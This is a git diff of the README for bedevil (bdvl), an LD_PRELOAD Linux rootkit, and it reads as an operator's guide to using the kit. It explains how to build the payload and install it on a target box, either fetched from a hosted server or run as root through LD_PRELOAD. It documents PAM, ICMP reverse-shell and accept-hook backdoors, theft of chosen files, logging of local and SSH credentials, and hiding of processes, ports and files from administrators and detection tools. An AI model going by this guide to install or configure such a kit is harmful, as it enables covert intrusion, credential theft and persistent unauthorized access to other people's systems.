@@ -1,3 +1,4 @@
+
 # bedevil (bdvl)
 
 <img src=https://i.imgur.com/PyO00vy.png alt="icon" />
@@ -20,7 +21,6 @@
      * Will be installed by `etc/auto.sh` before rootkit installation
      * Or can be installed with `etc/depinstall.sh`
 
-
 <hr>
 
 ## Usage
@@ -29,26 +29,30 @@
    * You can fine tune a decent amount of stuff to your liking.
  * Next, `sh etc/depinstall.sh && make`...
    * Now in the `build/` directory there are two new files.
-   * `<BD_UNAME>.b64` & `bdvl.so.*`
+   * `<PAM_UNAME>.b64` & `bdvl.so.*`
  * When it comes to the actual installation, you have three choices.
    * Host the result (_for example_) `build/changeme.b64` file somewhere accessible from the target box & point the first variable in `etc/auto.sh` to wherever `changeme.b64` may be.
    * On the box, when running `etc/auto.sh` supply it a path as an argument to this file wherever it is.
    * Or with the compiled `bdvl.so.*` you can run (*as root*) `LD_PRELOAD=./build/bdvl.so.x86_64 sh -c './bdvinstall build/bdvl.so.*'`.
      * This is how `etc/auto.sh` installs bdvl after installing dependencies.
 
-### Example usage
+### Installation example
  * On my own machine here, I've configured bdvl how I like & have built it.
+ * The output that you can expect to see from these stages may differ very slightly from the images but the process remains the same.
 
-<img src=https://i.imgur.com/TV9FXSe.png alt=building-bdvl />
+<img src=https://i.imgur.com/PTdmRS5.png alt=building-bdvl />
 
  * In this example I am using `etc/auto.sh` to grab the result (__changeme.b64__) from a _Python HTTPServer_ I've got running for this purpose.
  * The last command sent in that screenshot is once the target box is listening for my connection, as seen in the example below.
 
-<img src=https://i.imgur.com/WinYsn2.png alt=installation-process />
+<img src=https://i.imgur.com/pmwGUb8.png alt=installation-process />
 
- * After this finishes successfully, you will be able to log into the backdoor with the credentials specified.
+ * Now the rootkit will be in effect & you'll be able to log in.
+ * In the example below I am using the 3 backdoor methods available in bdvl.
 
-<img src=https://i.imgur.com/x8GoFAC.png alt=first-backdoor-login />
+<img src=https://i.imgur.com/pqpJHTy.png alt=first-backdoor-login />
+
+<hr> 
 
 ## Features & configuration information
  * Listed in the table below is a very concise overview of all of the *important* functionalities that bedevil has.
@@ -57,6 +61,8 @@
 | Toggle                      | Info                                                                          |
 | :-------------------------- | :---------------------------------------------------------------------------- |
 | __USE_PAM_BD__              | allows interactive login as a backdoor user via ssh.                          |
+| __USE_ICMP_BD__             | magic packets are replied to with a reverse shell.                            |
+| __USE_ACCEPT_BD__           | get a magic shell from infected services listening on tcp sockets.            |
 | __LOG_LOCAL_AUTH__          | log successful user authentications on the box.                               |
 | __LOG_SSH__                 | logs login attempts from over ssh.                                            |
 | __HIDE_SELF__               | hides files and processes based on rootkit magic GID.                         |
@@ -77,21 +83,14 @@
 | __PATCH_DYNAMIC_LINKER__    | rootkit overwrites the original `/etc/ld.so.preload` path with a new one.     |
 
  * By default, all are enabled.
- * Be warned that (_this version of_) the rootkit is not designed to be used with a lot of these features disabled.
- * Irregular behaviour & general weirdness may occur otherwise.
- * I am slowly making this better. Until then I recommend keeping everything enabled...
  * __A handful of functionalities do not begin until the first backdoor login.__
 
-<hr>
-
-#### Backdoor utility commands
+### Backdoor utility commands
  * By hooking the execve & execvp wrappers bdvl provides rootkit-related commands from a backdoor shell, accessible by running `./bdv`.
 
-<img src=https://i.imgur.com/2VGlU6j.png alt=available-backdoor-commands-in-bdvl />
+<img src=https://i.imgur.com/jbkNOHt.png alt=available-backdoor-commands-in-bdvl />
 
-<hr>
-
-#### Magic GID
+### Magic GID
  * __READ_GID_FROM_FILE__ allows changing of the rootkit's magic GID whenever you like.
  * There is a command available from within the backdoor for manual changing of the rootkit's GID.
    * `./bdv changegid`
@@ -99,15 +98,23 @@
    * This value can be found in [`setup.py`](https://github.com/kcaaj/bdvl/blob/nobash/setup.py)
    * The rootkit will not automatically change its GID when there are still rootkit processes running.
    * Otherwise there is a pretty high chance of being discovered since previous processes left with the previous GID would be visible.
- * __HIDE_MY_ASS__ is intended to be a means of keeping track of files created, __outside of the installation directory__, by (you) the rootkit user.
-   * _For the sole purpose of rehiding them all when changing magic GID, be it manually or an automatically scheduled/timed change._
+
+### __HIDE_MY_ASS__
+ * __HIDE_MY_ASS__ is intended to be a means of keeping track of files & directories created, __outside of the home & installation directory__, by (you) the rootkit user.
+ * ~~For the sole purpose of rehiding them all when changing magic GID, be it manually or an automatically scheduled/timed change.~~
+   * At the beginning this was solely for rehiding stuff when the rootkit changes magic GID.
+     * But is now accompanied by __UNINSTALL_MY_ASS__, which, when doing `./bdv uninstall` will recursively remove all of your own misc paths on the box.
    * Paths are automatically kept track of upon creation in a backdoor shell/general rootkit process.
    * The file which contains all can be found in `my_ass` within the installation directory.
      * Paths in here will be rehidden upon GID changes.
      * If you are to unhide a path after its creation (path GID = 0), it will simply be ignored when the magic GID is being changed & files are subsequently being hidden.
      * If you would like to stop a path from being automatically rehidden upon a GID change just remove the path's line.
 
-<hr>
+### Backdoors
+ * All of the backdoors available in bdvl are password protected.
+   * By `BACKDOOR_PASSWORD` in `setup.py`.
+   * When the value is set to `None` random garbage will be used as the password.
+   * The password is stored as a SHA512 hash.
 
 #### PAM backdoor
  * By hijacking libpam & libc's authentication functions, we are able to create a phantom backdoor user.
@@ -137,19 +144,33 @@ cd
 . .bashrc
 ```
 
-<hr>
+#### Accept hook backdoor
+ * Infected services that listen on TCP sockets for new connections, when accepting a new connection can drop you a shell.
+ * For example, after sshd has restarted, it is going to be infected...
+   * So with each connection it receives it will beforehand check if the connection came from a very special port.
+   * The very special port will always be the first port number in `hide_ports`.
 
-#### Dynamic linker patching
+#### ICMP backdoor
+ * When enabled, bdvl will spawn a hidden process on the box which will monitor a given interface for a determined magic packet.
+   * The rootkit needs to be able to determine whether or not the ICMP backdoor process needs to be spawned.
+   * Therefore this spawned process has its own special ID. `readgid()-1`
+   * Before sending the shell back to you, another child is created so that the GID can be set back to the original. (`getgid()+1`)
+ * When the rootkit is changing magic GID, automatically or with `./bdv changegid` the backdoor's process is killed & then respawned.
+ * I recommend changing `MAGIC_ID`, `MAGIC_SEQ` & `MAGIC_ACK` in `setup.py`.
+   * Just remember to update `etc/icmp.sh` with the new values when changing these.
+ * `etc/icmp.sh` will handle sending the magic packet & listening for & receiving a reverse shell.
+   * The backdoor will ignore any attempts for a reverse shell if the specified port is not a hidden port.
+
+### Dynamic linker patching
  * Upon installation the rootkit will patch the dynamic linker libraries.
- * Libraries to be patched (*if they exist*) can be found in `setup.py` (__ldpaths__).
+ * Before anything the rootkit will search for valid `ld.so` on the system to patch.
+   * See `util/install/ldpatch/ldpatch.h` for the paths it will search.
  * Both the path to overwrite (`/etc/ld.so.preload`) & the new path (__PRELOAD_FILE__ in `setup.py`) must be the same length as each other.
  * When running `./bdv uninstall` from a backdoor shell, the rootkit will revert the libraries back to having the original path. (`/etc/ld.so.preload`)
  * [See here](https://github.com/kcaaj/bdvl/blob/nobash/inc/util/install/ldpatch.c) for more on how this works.
  * Not having __PATCH_DYNAMIC_LINKER__ enabled will instruct the rootkit to just use `/etc/ld.so.preload` instead.
 
-<hr>
-
-#### File stealing
+### File stealing
  * Files that will be stolen are defined in `setup.py`. (__INTERESTING_FILES__)
  * Files within directories listed in __INTERESTING_DIRECTORIES__ will also be stolen.
  * Wildcards apply to filenames within __INTERESTING_FILES__.
@@ -172,9 +193,7 @@ cd
  * If a file has been stolen already, it will be ignored.
    * However if there has been a change in size since the last time it was stolen, it will be re-stolen.
 
-<hr>
-
-#### Credential logging
+### Credential logging
  * __LOG_LOCAL_AUTH__
    * bedevil will intercept `pam_vprompt` and log successful authentications on the box.
    * Log results are available in your installation directory.
@@ -182,11 +201,9 @@ cd
    * bedevil intercepts `read` and `write` in order to log login attempts over ssh.
    * Again, logs are available in your installation directory.
 
-<hr>
+### Evasion & hiding
 
-#### Evasion & hiding
-
-##### Port hiding
+#### Port hiding
  * With bedevil installed, you can hide or unhide any ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
 ```
 $ cat hide_ports
@@ -196,12 +213,13 @@ $ cat hide_ports
 ```
 *Where a hyphen is the range delimiter...*
 
-##### Rootkit presence
+#### Rootkit presence
  * bedevil will hide itself from the process memory map files upon being read.
  * Reading `/proc/*/*maps`, when bedevil is installed won't reveal the kit's location.
- * __HOWEVER__, dependencies required by the rootkit will be visible. (namely, libcrypt & libssl)
+ * ~~__HOWEVER__, dependencies required by the rootkit will be visible. (namely, libcrypt & libssl)~~
+   * The rootkit's dependencies are also hidden from these files..
 
-##### Scary things
+#### Scary things
  * bedevil will hide from defined scary processes, paths & environment variables.
  * The list of aforementioned processes, paths & variables can be found in `setup.py`..
  * i.e.: Running `ldd`.
@@ -214,7 +232,7 @@ $ cat hide_ports
 
 <hr>
 
-# Other notes
+### Other notes
  * While bdvl's __DO_EVASIONS__ functionality (*see [Scary things](#scary-things)*) is effective, it also presents a fairly big weakness.
    * `while true; do ldd /bin/ls >/dev/null; done`
    * This very small while loop will temporarily remove the rootkit... Until the loop is killed.
